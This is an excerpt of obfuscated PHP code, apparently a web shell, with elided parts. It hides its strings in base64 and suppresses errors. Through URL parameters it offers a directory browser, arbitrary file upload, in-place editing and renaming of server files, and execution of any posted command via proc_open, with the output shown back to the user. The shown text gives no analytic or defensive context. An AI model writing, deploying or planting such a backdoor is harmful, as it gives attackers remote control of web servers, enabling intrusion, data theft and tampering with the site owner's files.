...
error_reporting(0); 
set_time_limit(0);
$q0 = base64_decode('ZmlsZQ==');
if (isset($_GET[$q0])) {
	$s1 = __DIR__;
	$o2 = isset($_GET[base64_decode('ZGly')]) ? $_GET[base64_decode('ZGly')] : $s1;
	...
	echo base64_decode('PGEgaHJlZj0nPw==').$q0.base64_decode('JmRpcj0=') . urlencode(dirname($o2)) . base64_decode('Jz5HbyBVcDwvYT48YnI+PGJyPg==');
	$r3 = scandir($o2);
	echo base64_decode('PHVsPg==');
	foreach ($r3 as $t4) {
		if ($t4 != base64_decode('Lg==') && $t4 != base64_decode('Li4=')) {
			$q5 = $o2 . DIRECTORY_SEPARATOR . $t4;
			if (is_dir($q5)) {
				echo base64_decode('PGxpPjxhIGhyZWY9Jz8=').$q0.base64_decode('JmRpcj0=') . urlencode($q5) . "'>[DIR] $t4</a></li>";
			} else {
				echo "<li>$t4 - 
				<a href='?".$q0.base64_decode('JmVkaXQ9') . urlencode($q5) . base64_decode('Jz5FZGl0PC9hPiB8DQoJCQkJPGEgaHJlZj0nPw==').$q0.base64_decode('JnJlbmFtZT0=') . urlencode($q5) . base64_decode('Jz5SZW5hbWU8L2E+DQoJCQkJPC9saT4=');
			}
		}
	}
	echo base64_decode('PC91bD4=');
	if (isset($_FILES[base64_decode('ZmlsZQ==')])) {
		$b6 = $_FILES[base64_decode('ZmlsZQ==')][base64_decode('bmFtZQ==')];
		$c7  = $_FILES[base64_decode('ZmlsZQ==')][base64_decode('dG1wX25hbWU=')];
		if (move_uploaded_file($c7, $o2 . DIRECTORY_SEPARATOR . $b6)) {
			echo base64_decode('W09LXSA9PT0+IA==') . $b6;
		}
	}
	if (isset($_POST[base64_decode('eG1k')])) {
		$l8 = $_POST[base64_decode('eG1k')];
		$p9 = [
			0 => [base64_decode('cGlwZQ=='), base64_decode('cg==')], 
			1 => [base64_decode('cGlwZQ=='), base64_decode('dw==')], 
			2 => [base64_decode('cGlwZQ=='), base64_decode('dw==')], 
		];
		$ea = proc_open($l8, $p9, $hb);
		$mc = stream_get_contents($hb[1]);
		$cd = stream_get_contents($hb[2]);
		fclose($hb[0]);
		fclose($hb[1]);
		fclose($hb[2]);
		proc_close($ea);
		echo "<textarea cols=30 rows=15;>$mc</textarea>";
		echo "<textarea cols=30 rows=15;>Error:\n$cd\n</textarea>";
	}
	if (isset($_GET[base64_decode('ZWRpdA==')])) {
		$te = $_GET[base64_decode('ZWRpdA==')];
		if (file_exists($te)) {
			if ($_SERVER[base64_decode('UkVRVUVTVF9NRVRIT0Q=')] === base64_decode('UE9TVA==') && isset($_POST[base64_decode('ZmlsZV9jb250ZW50')])) {
				file_put_contents($te, $_POST[base64_decode('ZmlsZV9jb250ZW50')]);
				echo base64_decode('W09LXSBGaWxlIHVwZGF0ZWQu');
			}
			$jf = htmlspecialchars(file_get_contents($te));
			echo "<h3>Editing: $te</h3>
			<form method='POST'>
				<textarea name='file_content' rows='20' cols='80'>$jf</textarea><br>
	...
	if (isset($_GET[base64_decode('cmVuYW1l')])) {
		...
		if (file_exists($k10)) {
			...
			echo "<h3>Renaming: $k10</h3>
			<form method='POST'>
				<input type='text' name='new_name' value='" . basename($k10) . base64_decode('Jz4NCgkJCQk8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nUmVuYW1lJz4NCgkJCTwvZm9ybT4=');
		} else {
